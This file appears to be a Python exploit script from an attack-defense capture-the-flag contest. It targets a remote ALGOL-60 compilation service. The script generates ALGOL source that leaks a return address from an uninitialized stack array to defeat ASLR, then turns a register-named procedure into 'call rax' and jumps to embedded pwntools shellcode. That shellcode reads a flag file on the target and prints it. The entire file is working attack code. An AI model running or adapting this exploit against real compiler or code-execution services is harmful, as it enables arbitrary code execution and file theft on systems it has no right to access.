import pwn
import utils

utils.PATCH_RODATA_OR_RECOMPILE = False

# Use register name (rax,rdi...) as function name, as this will lead to register call with assembly intel syntax.
# To create an exploit you need some undefined behavior to break ASLR and some way to set specific registers.
# This exploit expects compiler not overriding stackframe with uninitialized local variables.
# This exploit expected rax not being overwritten after integer divison.
# This exploit expects '-z noseparate-code' used in linker.

# Define the "rax" function that will result in a register call.
# Call function "add" that does a bit of recursion.
# Then in main scan the uninitialized "arr" for binary addresses (>0x7f0000000000).
# Try to find a dupplicate one, which should be the recusive return addr.
# Then make a integer divison to get the shellcode address into rax.
# Then do the "call rax".
exploit_code = f"""
'BEGIN'
  'PROCEDURE' rax;
    outinteger(1);

  'INTEGER' 'PROCEDURE' add(n);
    'INTEGER' n;
    add := 'IF' n > 0 'THEN' add(n-1) + 1 'ELSE' 0;

  'PROCEDURE' main;
    'INTEGER' 'ARRAY' arr[16];
    'INTEGER' i, lastAddr;
  'BEGIN'
    lastAddr := 0;
    'FOR' i := 0 'STEP' 1 'UNTIL' 15 'DO'
      'IF' arr[i] > {0x7f0000000000} 'THEN' 'BEGIN'
        'IF' arr[i] = lastAddr 'THEN'
          i := 16
        'ELSE'
          lastAddr := arr[i];
      'END';

    aOne := (lastAddr + %d) รท aOne;
    rax
  'END';

  'STRING' sc[%d];
  'INTEGER' aOne;
  aOne := 1;

  aOne := add(8) - 7;
  main;
  sc := "%s";
  outinteger(sc[12])
'END'
"""

pattern_shellcode = pwn.p64(0xFEFEFEFEFEFEFEFE)
# mustn't be larger 2 ** 63 - 1
pattern = 0x3F3F3F3F3F3F3F3F

def main(host, flag_id):
    shellcode = pwn.shellcraft.cat2(flag_id) + pwn.shellcraft.exit(0)
    shellcode = pwn.asm(shellcode)

    shellcode = pattern_shellcode + shellcode
    shellcodeStr = utils.shellcodeToStringLiteral(shellcode)

    # compile code with pattern for the offset constants and shellcode
    code = exploit_code % (pattern, len(shellcode) + 1, shellcodeStr)
    json, elf = utils.compileCode(host, code)

    # get value of recusive return address in add
    addRetAdddr = utils.getOffsetForReturnFromFirstCall(elf, "add")
    print("addRetAdddr", hex(addRetAdddr))

    # find constants by patterns in rodata
    rodata = elf.get_section_by_name(".rodata")
    pattern_off = rodata.data().index(pwn.p64(pattern))
    pattern_off += rodata['sh_offset']
    print("pattern_off", hex(pattern_off))

    # find shellcode in strings
    shellcode_off = utils.findInStrings(elf, pattern_shellcode)
    shellcode_off += len(pattern_shellcode)
    print("shellcode_off", hex(shellcode_off))

    # patch rodata or recompile
    json = utils.replacePatternWith(host, json, elf, code, replacements=[
        # pattern is the offset from addRetAdddr to shellcode
        (pattern, shellcode_off - addRetAdddr)
    ])

    # execute binary
    stdout = utils.executeAndRetStdout(host, json)
    print(stdout)


utils.launchExploit(main)
